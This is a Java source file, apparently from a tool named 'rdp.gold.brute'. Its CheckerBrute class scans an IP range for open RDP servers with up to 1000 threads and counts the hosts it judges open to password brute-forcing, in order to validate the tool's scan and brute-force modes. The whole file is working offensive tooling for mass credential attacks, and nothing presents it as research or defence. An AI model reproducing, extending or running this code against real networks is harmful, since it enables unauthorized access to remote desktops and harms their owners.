package rdp.gold.brute;

import java.util.Collections;
import java.util.List;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.atomic.AtomicLong;

import org.apache.log4j.Logger;

import rdp.gold.brute.entity.Host;
import rdp.gold.brute.pool.ScanThread;

@SuppressWarnings({ "unchecked", "rawtypes" })
public class CheckerBrute extends Thread {
    private static final Logger logger = Logger.getLogger(CheckerBrute.class);
    private Status status = Status.UNCHECKED;
    private static final AtomicLong rdpCount = new AtomicLong(0L);
    private static final AtomicLong brutableCount = new AtomicLong(0L);

    private static boolean runTestScan() {
        try {
            final Queue<Host> scannedHosts = new ConcurrentLinkedQueue();
            rdpCount.set(0L);
            brutableCount.set(0L);
            int port = Integer.parseInt(Config.TEST_SERVER_START_IP.split(":")[1]);

            List<String> ipListTest = IPUtil.getIpList(Config.TEST_SERVER_START_IP.split(":")[0], Config.TEST_SERVER_END_IP.split(":")[0]);
            Collections.shuffle(ipListTest);

            Queue<String> testQueue = new ConcurrentLinkedQueue();
            testQueue.addAll(ipListTest);

            ThreadGroup threadPduGroup = new ThreadGroup("workers_pdu");

            ExecutorService executorsPdu = Executors.newCachedThreadPool(new ThreadFactory() {
                public Thread newThread(Runnable r) {
                    return new Thread(threadPduGroup, r);
                }
            });
            try {
                while (((Config.IS_ENABLED_BRUTE.get()) || (Config.IS_ENABLED_SCAN.get())) && (rdpCount.get() < Config.CHECKER_EXPECT_IP_FOR_ENABLE_SCAN.intValue())) {
                    if ((Config.IS_ENABLED_SCAN.get()) && (rdpCount.get() >= Config.CHECKER_EXPECT_IP_FOR_ENABLE_SCAN.intValue())) {
                        break;
                    }
                    if ((Config.IS_ENABLED_BRUTE.get()) && (brutableCount.get() >= Config.CHECKER_EXPECT_BRUTABLE_IP_FOR_ENABLE_BRUTE.intValue())) {
                        break;
                    }
                    int pushLimit = Config.SCAN_THREADS.intValue() - ((ThreadPoolExecutor) executorsPdu).getActiveCount();
                    while (pushLimit > 0) {
                        String ip = (String) testQueue.poll();
                        if (ip == null) {
                            break;
                        }
                        Host host = new Host();
                        host.setIp(ip);
                        host.setPort(port);
                        // logger.info("Current Check IP -> " + ip +" Port -> " + port);
                        executorsPdu.submit(new Runnable() {
                            public void run() {
                                if (ScanThread.scan(host.getIp(), host.getPort())) {
                                    scannedHosts.add(host);
                                    CheckerBrute.rdpCount.incrementAndGet();
                                }
                                if ((Config.IS_ENABLED_BRUTE.get()) && (ScanThread.hasBrutable(host.getIp(), host.getPort()))) {
                                    CheckerBrute.brutableCount.incrementAndGet();
                                    host.setBrutable(Boolean.valueOf(true));
                                }
                            }
                        });
                        pushLimit--;
                    }
                    int activeThreads = ((ThreadPoolExecutor) executorsPdu).getActiveCount();
                    int queueSize = testQueue.size();

                    logger.info("Pool test size is now " + activeThreads + ", rdp " + rdpCount + ", pool " + queueSize + ", brutableCount " + brutableCount);
                    if (queueSize == 0) {
                        break;
                    }
                    Thread.sleep(1000L);
                }
            } catch (Exception e) {
                logger.error("Error threads", e);
            } finally {
                executorsPdu.shutdown();
            }
            return ((Config.IS_ENABLED_SCAN.get()) && (rdpCount.get() >= Config.CHECKER_EXPECT_IP_FOR_ENABLE_SCAN.intValue()))
                    || ((Config.IS_ENABLED_BRUTE.get()) && (brutableCount.get() >= Config.CHECKER_EXPECT_BRUTABLE_IP_FOR_ENABLE_BRUTE.intValue()));
        } catch (Exception e) {
            logger.error(e);
        }
        return false;
    }

    public void run() {
        try {
            for (;;) {
                Thread.sleep(100L);
            }
        } catch (InterruptedException localInterruptedException) {
        }
    }

    public synchronized void runChecker() {
        if (this.status == Status.RUN) {
            return;
        }
        this.status = Status.RUN;

        new Thread(new Runnable() {
            public void run() {
                boolean isValidBrute = CheckerBrute.runTestScan();

                Config.IS_TEST_SERVER_SCAN.set(false);
                Config.IS_VALID_SERVER_SCAN.set(isValidBrute);

                Config.IS_TEST_SERVER_BRUTE.set(false);
                Config.IS_VALID_SERVER_BRUTE.set(isValidBrute);

                CheckerBrute.this.status = (isValidBrute ? CheckerBrute.Status.VALID : CheckerBrute.Status.INVALID);
            }
        })

                .start();
    }

    public void awaitCheck() {
        while (this.status == Status.RUN) {
            try {
                Thread.sleep(100L);
            } catch (InterruptedException localInterruptedException) {
            }
        }
    }

    public Status getStatus() {
        return this.status;
    }

    public static enum Status {
        UNCHECKED, VALID, INVALID, RUN;

        private Status() {
        }
    }

    public static AtomicLong getRdpCount() {
        return rdpCount;
    }

    public static AtomicLong getBrutableCount() {
        return brutableCount;
    }

    public static void main(String[] argc) {
        Config.IS_ENABLED_BRUTE.set(true);
        Config.SCAN_THREADS = Integer.valueOf(1000);
        CheckerBrute checkerBrute = new CheckerBrute();
        checkerBrute.runChecker();
    }
}
